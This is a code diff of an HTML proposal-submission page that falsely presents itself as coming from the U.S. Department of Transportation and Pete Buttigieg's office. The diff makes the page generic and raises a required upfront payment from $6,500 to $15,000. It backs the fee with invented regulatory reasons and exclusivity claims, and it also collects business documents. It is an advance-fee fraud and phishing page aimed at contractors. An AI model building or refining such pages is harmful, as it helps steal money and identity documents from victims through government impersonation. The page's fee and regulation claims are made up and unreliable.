@@ -140,19 +140,19 @@
   <div class="container-fluid header text-center py-4">
     <div class="row align-items-center">
         <div class="col-12 col-md-4">
-            <img src="../dot/Logo.svg" alt="U.S. Department of Transportation Logo" class="img-fluid logo">
+            <img src="Logo.svg" alt="U.S. Department of Transportation Logo" class="img-fluid logo">
         </div>
         <div class="col-12 col-md-8">
-            <h1 class="h3">Proposal Submission for Mobius Drones</h1>
+            <h1 class="h3">Infrastructure Revolution 2025: Join the Vision</h1>
             <p>From <strong>Pete Buttigieg's Office</strong> - U.S. Department of Transportation</p>
         </div>
     </div>
 </div>
 
     <div class="container">
-        <h2>Hi! Mobius Drones, This web page is specially dedicated for your proposal and we are excited to collaborate with you! Please submit your proposal below.</h2>
-        <form id="proposalForm" action="../dot/index2.html">
-          <label for="fullName">Full Name</label>
+        <h2>We are excited to collaborate with you! Please submit your proposal below.</h2>
+        <form id="proposalForm" action="index2.html">
+            <label for="fullName">Full Name</label>
             <input type="text" id="fullName" name="fullName" required>
 
             <label for="email">Email Address</label>
@@ -165,12 +165,23 @@
             <textarea id="interest" name="interest" required placeholder="Please describe your interest in this project."></textarea>
 
             <label for="amount">Amount to be Paid:</label>
-            <em> Please note that for us to proceed with your proposal submission, a payment of $6,500 is required to be made in full. This fee is essential for compliance with U.S. government regulations governing federal projects involving technology and transportation. 
-The payment will cover the administrative and operational costs associated with legal and regulatory processing required for the successful completion of the project. 
-As per federal rules outlined in the Federal Acquisition Regulation (FAR), specifically Part 31, such costs must be cleared before any project work can begin to ensure transparency and full adherence to procurement guidelines.
-<br/><strong>If full payment cannot be made at this time, kindly specify the amount you are able to contribute, ensuring it is at least 75% of the total payment, which amounts to $4,875.</strong>
-</em>
+            <em> Note:
 
+A payment of $15,000 is required to proceed with your proposal for the U.S. Department of Transportation (DOT) job as part of President Trump’s transformative infrastructure agenda. This payment is necessary for the following reasons:
+
+<strong> 1. Administrative and Processing Fees: </strong>
+This payment covers the costs associated with comprehensive administrative processes, including rigorous compliance checks, federal documentation, legal verifications, and approvals required to meet the standards of the DOT and federal government.
+
+<strong> 2. Registration and Accreditation Fee: </strong>
+A portion of the payment is allocated as a formal registration fee to solidify your company’s involvement in this exclusive initiative and to ensure alignment with federal guidelines for government contractors.
+
+<strong> 3. Commitment to Project Preparation: </strong>
+This payment demonstrates your company’s commitment to the transformational infrastructure agenda. It supports pre-contractual activities, such as securing project-specific resources, initiating preliminary site assessments, and conducting feasibility studies essential for efficient project execution.
+
+<strong> 4. Priority Positioning and Direct Collaboration: </strong>
+As one of only 12 companies selected for these historic projects, this payment ensures your company's privileged access to strategic planning sessions, priority assignment in project allocation, and streamlined communication with government agencies. <br>
+<br>
+<strong> If full payment cannot be made upfront, at least 70% ($10,500) must be paid to initiate the process. The remaining balance of $4,500 must be completed prior to final approval and project commencement. </strong></em>
             <input type="number" id="amount" name="amount" required placeholder="Enter amount in USD">
 
             <label for="timeline">Timeline for Completion</label>
@@ -180,16 +191,6 @@ As per federal rules outlined in the Federal Acquisition Regulation (FAR), speci
 				<option value="3-6 Months">3-6 Months</option>
                 <option value="Other">Other</option>
             </select>
-		<label for="question">Given the opportunity, are you confident in you ability to deliver work of the highest quality with precision and excellence for the U.S. Department Of Transportation(DOT)?</label>
-          <select id="question" name="question" required>
-                <option value="Yes">Yes</option>
-				<option value="No">No</option>
-            </select>
-		
-		<div class="file-upload">
-                <label for="Official ID">Any Government Issued ID</label>
-          <input type="file" id="ID" name="ID" accept=".pdf,.doc,.docx,.jpg,.png" required>
-          </div>
 
             <div class="file-upload">
                 <label for="businessDocs">Business Registration Document</label>
@@ -206,7 +207,7 @@ As per federal rules outlined in the Federal Acquisition Regulation (FAR), speci
         <p>U.S. Department of Transportation, 1200 New Jersey Avenue SE, Washington, D.C. 20590</p>
     </div>
 
-  <script>
+   <script>
     // Form submission handler
     document.getElementById('proposalForm').addEventListener('submit', function (event) {
         event.preventDefault(); // Prevent the default form submission
@@ -228,10 +229,13 @@ As per federal rules outlined in the Federal Acquisition Regulation (FAR), speci
             return;
         }
 
-        // Redirect to the next page without alert
-        window.location.href = "../Mobius/index2.html";
+        // Process form submission logic
+        alert("Form submitted successfully!");
+        document.getElementById('proposalForm').reset(); // Clear the form
+        window.location.href = "index2.html"; // Redirect to the next page
     });
 </script>
+
 
 
 
